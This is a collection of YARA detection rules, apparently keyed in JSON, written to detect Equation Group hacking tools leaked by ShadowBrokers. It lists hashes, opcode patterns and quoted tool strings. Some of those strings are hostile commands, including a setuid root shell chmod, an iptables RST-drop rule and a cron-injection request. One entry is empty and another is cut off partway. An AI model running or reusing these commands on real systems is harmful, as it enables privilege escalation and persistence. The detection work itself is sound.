  "EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4": "rule EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files pclean.v2.1.1.0-linux-i386, pclean.v2.1.1.0-linux-x86_64\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      super_rule = 1\n      hash1 = \"cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97\"\n      hash2 = \"ab7f26faed8bc2341d0517d9cb2bbf41795f753cd21340887fc2803dc1b9a1dd\"\n   strings:\n      $s1 = \"-c cmd_name:     strncmp() search for 1st %d chars of commands that \" fullword ascii\n      $s2 = \"e.g.: -n 1-1024,1080,6666,31337 \" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 50KB and all of them )\n}",
  "EquationGroup__jparsescan_parsescan_5": "rule EquationGroup__jparsescan_parsescan_5 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files jparsescan, parsescan\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      super_rule = 1\n      hash1 = \"8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984\"\n      hash2 = \"942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef\"\n   strings:\n      $s1 = \"# default is to dump out all scanned hosts found\" fullword ascii\n      $s2 = \"$bool .= \\\" -r \\\" if (/mibiisa.* -r/);\" fullword ascii\n      $s3 = \"sadmind is available on two ports, this also works)\" fullword ascii\n      $s4 = \"-x IP      gives \\\\\\\"hostname:# users:load ...\\\\\\\" if positive xwin scan\" fullword ascii\n   condition:\n      ( uint16(0) == 0x2123 and filesize < 40KB and 1 of them ) or ( 2 of them )\n}",
  "EquationGroup__funnelout_v4_1_0_1": "",
  "EquationGroup__magicjack_v1_1_0_0_client": "rule EquationGroup__magicjack_v1_1_0_0_client {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files magicjack_v1.1.0.0_client-1.1.0.0.py\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      super_rule = 1\n      hash1 = \"63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1\"\n   strings:\n      $s1 = \"temp = ((left >> 1) ^ right) & 0x55555555\" fullword ascii\n      $s2 = \"right ^= (temp <<  16) & 0xffffffff\" fullword ascii\n      $s3 = \"tempresult = \\\"\\\"\" fullword ascii\n      $s4 = \"num = self.bytes2long(data)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x2123 and filesize < 80KB and 3 of them ) or ( all of them )\n}",
  "EquationGroup__ftshell": "rule EquationGroup__ftshell {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08\"\n      super_rule = 1\n      hash1 = \"9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893\"\n      hash4 = \"0be739024b41144c3b63e40e46bab22ac098ccab44ab2e268efc3b63aea02951\"\n   strings:\n      $s1 = \"if { [string length $uRemoteUploadCommand]\" fullword ascii\n      $s2 = \"processUpload\" fullword ascii\n      $s3 = \"global dothisreallyquiet\" fullword ascii\n   condition:\n      ( uint16(0) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )\n}\n\n/*\n   Yara Rule Set\n   Author: Florian Roth\n   Date: 2017-04-09\n   Identifier: Equation Group hack tools leaked by ShadowBrokers\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nrule EquationGroup_store_linux_i386_v_3_3_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"abc27fda9a0921d7cf2863c29768af15fdfe47a0b3e7a131ef7e5cc057576fbc\"\n   strings:\n      $s1 = \"[-] Failed to map file: %s\" fullword ascii\n      $s2 = \"[-] can not NULL terminate input data\" fullword ascii\n      $s3 = \"[!] Name has size of 0!\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 60KB and all of them )\n}\n\nrule EquationGroup_morerats_client_genkey {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"0ce455fb7f46e54a5db9bef85df1087ff14d2fc60a88f2becd5badb9c7fe3e89\"\n   strings:\n      $x1 = \"rsakey_txt = lo_execute('openssl genrsa 2048 2> /dev/null | openssl rsa -text 2> /dev/null')\" fullword ascii\n      $x2 = \"client_auth = binascii.hexlify(lo_execute('openssl rand 16'))\" fullword ascii\n   condition:\n      ( filesize < 3KB and all of them )\n}\n\nrule EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"614bf159b956f20d66cedf25af7503b41e91841c75707af0cdf4495084092a61\"\n   strings:\n      $s1 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n      $s2 = \"0123456789abcdefABCEDF:\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )\n}\n\nrule EquationGroup_cursesleepy_mswin32_v_1_0_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"6293439b4b49e94f923c76e302f5fc437023c91e063e67877d22333f05a24352\"\n   strings:\n      $s1 = \"A}%j,R\" fullword ascii\n      $op1 = { a1 e0 43 41 00 8b 0d 34 44 41 00 6b c0 } /* Opcode */\n      $op2 = { 33 C0 F3 A6 74 14 8B 5D 08 8B 4B 34 50 } /* Opcode */\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )\n}",
  "EquationGroup_store_linux_i386_v_3_3_0": "rule EquationGroup_store_linux_i386_v_3_3_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"abc27fda9a0921d7cf2863c29768af15fdfe47a0b3e7a131ef7e5cc057576fbc\"\n   strings:\n      $s1 = \"[-] Failed to map file: %s\" fullword ascii\n      $s2 = \"[-] can not NULL terminate input data\" fullword ascii\n      $s3 = \"[!] Name has size of 0!\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 60KB and all of them )\n}",
  "EquationGroup_morerats_client_genkey": "rule EquationGroup_morerats_client_genkey {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"0ce455fb7f46e54a5db9bef85df1087ff14d2fc60a88f2becd5badb9c7fe3e89\"\n   strings:\n      $x1 = \"rsakey_txt = lo_execute('openssl genrsa 2048 2> /dev/null | openssl rsa -text 2> /dev/null')\" fullword ascii\n      $x2 = \"client_auth = binascii.hexlify(lo_execute('openssl rand 16'))\" fullword ascii\n   condition:\n      ( filesize < 3KB and all of them )\n}",
  "EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1": "rule EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"614bf159b956f20d66cedf25af7503b41e91841c75707af0cdf4495084092a61\"\n   strings:\n      $s1 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n      $s2 = \"0123456789abcdefABCEDF:\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )\n}",
  "EquationGroup_cursesleepy_mswin32_v_1_0_0": "rule EquationGroup_cursesleepy_mswin32_v_1_0_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"6293439b4b49e94f923c76e302f5fc437023c91e063e67877d22333f05a24352\"\n   strings:\n      $s1 = \"A}",
  "EquationGroup_porkserver_v3_0_0": "rule EquationGroup_porkserver_v3_0_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"7b5f86e289047dd673e8a09438d49ec43832b561bac39b95098f5bf4095b8b4a\"\n   strings:\n      $s1 = \"%s: %s rpcprog=%d, rpcvers = %d/%d, proto=%s, wait.max=%d.%d, user.group=%s.%s builtin=%lx server=%s\" fullword ascii\n      $s2 = \"%s/%s server failing (looping), service terminated\" fullword ascii\n      $s3 = \"getpwnam: %s: No such user\" fullword ascii\n      $s4 = \"execv %s: %m\" fullword ascii\n      $s5 = \"%s/%s: getsockname: %m\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 70KB and 4 of them )\n}",
  "EquationGroup_cursehelper_win2k_i686_v_2_2_0": "rule EquationGroup_cursehelper_win2k_i686_v_2_2_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"5ac6fde8a06f4ade10d672e60e92ffbf78c4e8db6b5152e23171f6f53af0bfe1\"\n   strings:\n      $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/{}\" fullword ascii\n\n      $op1 = { 8d b5 48 ff ff ff 89 34 24 e8 56 2a 00 00 c7 44 } /* Opcode */\n      $op2 = { e9 a2 f2 ff ff ff 85 b4 fe ff ff 8b 95 a8 fe ff } /* Opcode */\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 500KB and all of them )\n}",
  "EquationGroup_morerats_client_addkey": "rule EquationGroup_morerats_client_addkey {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"6c67c03716d06a99f20c1044585d6bde7df43fee89f38915db0b03a42a3a9f4b\"\n   strings:\n      $x1 = \"print '  -s storebin  use storebin as the Store executable\\\\n'\" fullword ascii\n      $x2 = \"os.system('%s --file=\\\"%s\\\" --wipe > /dev/null' % (storebin, b))\" fullword ascii\n      $x3 = \"print '  -k keyfile   the key text file to inject'\" fullword ascii\n   condition:\n      ( filesize < 20KB and 1 of them )\n}",
  "EquationGroup_noclient_3_3_2": "rule EquationGroup_noclient_3_3_2 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"3cf0eb010c431372af5f32e2ee8c757831215f8836cabc7d805572bb5574fc72\"\n   strings:\n      $x1 = \"127.0.0.1 is not advisable as a source. Use -l 127.0.0.1 to override this warning\" fullword ascii\n      $x2 = \"iptables -%c OUTPUT -p tcp -d 127.0.0.1 --tcp-flags RST RST -j DROP;\" fullword ascii\n      $x3 = \"noclient: failed to execute %s: %s\" fullword ascii\n      $x4 = \"sh -c \\\"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \\\"\" fullword ascii\n      $s5 = \"Attempting connection from 0.0.0.0:\" ascii\n   condition:\n      ( filesize < 1000KB and 1 of them )\n}",
  "EquationGroup_curseflower_mswin32_v_1_0_0": "rule EquationGroup_curseflower_mswin32_v_1_0_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"fdc452629ff7befe02adea3a135c3744d8585af890a4301b2a10a817e48c5cbf\"\n   strings:\n      $s1 = \"<pVt,<et(<st$<ct$<nt\" fullword ascii\n\n      $op1 = { 6a 04 83 c0 08 6a 01 50 e8 10 34 00 00 83 c4 10 } /* Opcode */\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )\n}",
  "EquationGroup_tmpwatch": "rule EquationGroup_tmpwatch {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"65ed8066a3a240ee2e7556da74933a9b25c5109ffad893c21a626ea1b686d7c1\"\n   strings:\n      $s1 = \"chown root:root /tmp/.scsi/dev/bin/gsh\" fullword ascii\n      $s2 = \"chmod 4777 /tmp/.scsi/dev/bin/gsh\" fullword ascii\n   condition:\n      ( filesize < 1KB and 1 of them )\n}",
  "EquationGroup_orleans_stride_sunos5_9_v_2_4_0": "rule EquationGroup_orleans_stride_sunos5_9_v_2_4_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"6a30efb87b28e1a136a66c7708178c27d63a4a76c9c839b2fc43853158cb55ff\"\n   strings:\n      $s1 = \"_lib_version\" fullword ascii\n      $s2 = \",%02d%03d\" fullword ascii\n      $s3 = \"TRANSIT\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 200KB and all of them )\n}",
  "EquationGroup_morerats_client_noprep": "rule EquationGroup_morerats_client_noprep {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"a5b191a8ede8297c5bba790ef95201c516d64e2898efaeb44183f8fdfad578bb\"\n   strings:\n      $x1 = \"storestr = 'echo -n \\\"%s\\\" | Store --nullterminate --file=\\\"%s\\\" --set=\\\"%s\\\"' % (nopenargs, outfile, VAR_NAME)\" fullword ascii\n      $x2 = \"The NOPEN-args provided are injected into infile if it is a valid\" fullword ascii\n      $x3 = \" -i                do not autokill after 5 hours\" fullword ascii\n   condition:\n      ( filesize < 9KB and 1 of them )\n}",
  "EquationGroup_cursezinger_linuxrh7_3_v_2_0_0": "rule EquationGroup_cursezinger_linuxrh7_3_v_2_0_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"af7c7d03f59460fa60c48764201e18f3bd3f72441fd2e2ff6a562291134d2135\"\n   strings:\n      $s1 = \",%02d%03d\" fullword ascii\n      $s2 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n      $s3 = \"__strtoll_internal\" fullword ascii\n      $s4 = \"__strtoul_internal\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 400KB and all of them )\n}",
  "EquationGroup_seconddate_ImplantStandalone_3_0_3": "rule EquationGroup_seconddate_ImplantStandalone_3_0_3 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"d687aa644095c81b53a69c206eb8d6bdfe429d7adc2a57d87baf8ff8d4233511\"\n   strings:\n      $s1 = \"EFDGHIJKLMNOPQRSUT\" fullword ascii\n      $s2 = \"G8HcJ HcF LcF0LcN\" fullword ascii\n      $s3 = \"GhHcJ0HcF@LcF0LcN8H\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 1000KB and all of them )\n}",
  "EquationGroup_watcher_solaris_i386_v_3_3_0": "rule EquationGroup_watcher_solaris_i386_v_3_3_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"395ec2531970950ffafde234dded0cce0c95f1f9a22763d1d04caa060a5222bb\"\n   strings:\n      $s1 = \"getexecname\" fullword ascii\n      $s2 = \"invalid option `\" fullword ascii\n      $s6 = \"__fpstart\" fullword ascii\n      $s12 = \"GHFIJKLMNOPQRSTUVXW\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 700KB and all of them )\n}",
  "EquationGroup_gr_dev_bin_now": "rule EquationGroup_gr_dev_bin_now {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"f5ed8312fc6e624b04e1e2d6614f3c651c9e9902ff41f4d069c32caca0869fa4\"\n   strings:\n      $x1 = \"HTTP_REFERER=\\\"https://127.0.0.1:6655/cgi/redmin?op=cron&action=once\\\"\" fullword ascii\n      $x2 = \"exec /usr/share/redmin/cgi/redmin\" fullword ascii\n   condition:\n      ( filesize < 1KB and 1 of them )\n}",
  "EquationGroup_gr_dev_bin_post": "rule EquationGroup_gr_dev_bin_post {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"c1546155efa95dbc4e3cc95299a3968fc075f89d33164e78b00b76c7d08a0591\"\n   strings:\n      $x1 = \"op=cron&action=once&frame=cronOnceFrame&cronK=cronV&cronCommand=%2Ftmp%2Ftmpwatch&time=12%3A12+01%2F28%2F2005\" ascii\n   condition:\n      ( filesize < 1KB and all of them )\n}",
  "EquationGroup_curseyo_win2k_v_1_0_0": "rule EquationGroup_curseyo_win2k_v_1_0_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"5dc77614764b23a38610fdd8abe5b2274222f206889e4b0974a3fea569055ed6\"\n   strings:\n      $s1 = \"0123456789abcdefABCEDF:\" fullword ascii\n\n      $op0 = { c6 06 5b 8b bd 70 ff ff ff 8b 9d 64 ff ff ff 0f } /* Opcode */\n      $op1 = { 55 b8 ff ff ff ff 89 e5 83 ec 28 89 7d fc 8b 7d } /* Opcode */\n      $op2 = { ff 05 10 64 41 00 89 34 24 e8 df 1e 00 00 e9 31 } /* Opcode */\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )\n}",
  "EquationGroup_gr": "rule EquationGroup_gr {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"d3cd725affd31fa7f0e2595f4d76b09629918612ef0d0307bb85ade1c3985262\"\n   strings:\n      $s1 = \"if [ -f /tmp/tmpwatch ] ; then\" fullword ascii\n      $s2 = \"echo \\\"bailing. try a different name\\\"\" fullword ascii\n   condition:\n      ( filesize < 1KB and all of them )\n}",
  "EquationGroup_curseroot_win2k_v_2_1_0": "rule EquationGroup_curseroot_win2k_v_2_1_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"a1637948ed6ebbd2e582eb99df0c06b27a77c01ad1779b3d84c65953ca2cb603\"\n   strings:\n      $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s\" fullword ascii\n      $op0 = { c7 44 24 04 ff ff ff ff 89 04 24 e8 46 65 01 00 } /* Opcode */\n      $op1 = { 8d 5d 88 89 1c 24 e8 24 1b 01 00 be ff ff ff ff } /* Opcode */\n      $op2 = { d3 e0 48 e9 0c ff ff ff 8b 45 } /* Opcode */\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and $s1 and 2 of ($op*) )\n}",
  "EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k": "rule EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"aff27115ac705859871ab1bf14137322d1722f63705d6aeada43d18966843225\"\n      hash2 = \"7a25e26950bac51ca8d37cec945eb9c38a55fa9a53bc96da53b74378fb10b67e\"\n   strings:\n      $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s\" fullword ascii\n      $s3 = \",%02d%03d\" fullword ascii\n      $s4 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n\n      $op1 = { 7d ec 8d 74 3f 01 0f af f7 c1 c6 05 } /* Opcode */\n      $op2 = { 29 f1 89 fb d3 eb 89 f1 d3 e7 } /* Opcode */\n      $op3 = { 7d e4 8d 5c 3f 01 0f af df c1 c3 05 } /* Opcode */\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and 3 of them )\n}",
  "EquationGroup_watcher_linux_i386_v_3_3_0": "rule EquationGroup_watcher_linux_i386_v_3_3_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"ce4c9bfa25b8aad8ea68cc275187a894dec5d79e8c0b2f2f3ec4184dc5f402b8\"\n   strings:\n      $s1 = \"invalid option `\" fullword ascii\n      $s8 = \"readdir64\" fullword ascii\n      $s9 = \"89:z89:%r%opw\" fullword wide\n      $s13 = \"Ropopoprstuvwypypop\" fullword wide\n      $s17 = \"Missing argument for `-x'.\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 700KB and all of them )\n}",
  "EquationGroup_charm_saver_win2k_v_2_0_0": "rule EquationGroup_charm_saver_win2k_v_2_0_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"0f7936a37482532a8ba5df4112643ed7579dd0e59181bfca9c641b9ba0a9912f\"\n   strings:\n      $s2 = \"0123456789abcdefABCEDF:\" fullword ascii\n\n      $op0 = { b8 ff ff ff ff 7f 65 eb 30 8b 55 0c 89 d7 0f b6 } /* Opcode */\n      $op2 = { ba ff ff ff ff 83 c4 6c 89 d0 5b 5e 5f 5d c3 90 } /* Opcode */\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )\n}",
  "EquationGroup_cursehappy_win2k_v_6_1_0": "rule EquationGroup_cursehappy_win2k_v_6_1_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"eb669afd246a7ac4de79724abcce5bda38117b3138908b90cac58936520ea632\"\n   strings:\n      $op1 = { e8 24 2c 01 00 85 c0 89 c6 ba ff ff ff ff 74 d6 } /* Opcode */\n      $op2 = { 89 4c 24 04 89 34 24 89 44 24 08 e8 ce 49 ff ff } /* Opcode */\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )\n}",
  "EquationGroup_morerats_client_Store": "rule EquationGroup_morerats_client_Store {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"619944358bc0e1faffd652b6af0600de055c5e7f1f1d91a8051ed9adf5a5b465\"\n   strings:\n      $s1 = \"[-] Failed to mmap file: %s\" fullword ascii\n      $s2 = \"[-] can not NULL terminate input data\" fullword ascii\n      $s3 = \"Missing argument for `-x'.\" fullword ascii\n      $s4 = \"[!] Value has size of 0!\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 60KB and 2 of them )\n}",
  "EquationGroup_watcher_linux_x86_64_v_3_3_0": "rule EquationGroup_watcher_linux_x86_64_v_3_3_0 {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      hash1 = \"a8d65593f6296d6d06230bcede53b9152842f1eee56a2a72b0a88c4f463a09c3\"\n   strings:\n      $s1 = \"forceprismheader\" fullword ascii\n      $s2 = \"invalid option `\" fullword ascii\n      $s3 = \"forceprism\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 900KB and all of them )\n}",
  "EquationGroup_linux_exactchange": "rule EquationGroup_linux_exactchange {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      super_rule = 1\n      hash1 = \"dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6\"\n      hash2 = \"6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec\"\n      hash3 = \"39d4f83c7e64f5b89df9851bdba917cf73a3449920a6925b6cd379f2fdec2a8b\"\n      hash4 = \"15e12c1c27304e4a68a268e392be4972f7c6edf3d4d387e5b7d2ed77a5b43c2c\"\n   strings:\n      $x1 = \"[+] looking for vulnerable socket\" fullword ascii\n      $x2 = \"can't use 32-bit exploit on 64-bit target\" fullword ascii\n      $x3 = \"[+] %s socket ready, exploiting...\" fullword ascii\n      $x4 = \"[!] nothing looks vulnerable, trying everything\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 2000KB and 1 of them )\n}",
  "EquationGroup_x86_linux_exactchange": "rule EquationGroup_x86_linux_exactchange {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09\"\n      super_rule = 1\n      hash1 = \"dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6\"\n      hash2 = \"6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec\"\n   strings:\n      $x1 = \"kernel has 4G/4G split, not exploitable\" fullword ascii\n      $x2 = \"[+] kernel stack size is %d\" fullword ascii\n   condition:\n      ( uint16(0) == 0x457f and filesize < 1000KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher": "rule EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"48251fb89c510fb3efa14c4b5b546fbde918ed8bb25f041a801e3874bd4f60f8\"\n      hash2 = \"237c22f4d43fdacfcbd6e1b5f1c71578279b7b06ea8e512b4b6b50f10e8ccf10\"\n      hash3 = \"79a584c127ac6a5e96f02a9c5288043ceb7445de2840b608fc99b55cf86507ed\"\n   strings:\n      $x1 = \"[-] Failed to Prepare Payload!\" fullword ascii\n      $x2 = \"ShellcodeStartOffset\" fullword ascii\n      $x3 = \"[*] Waiting for AuthCode from exploit\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )\n}",
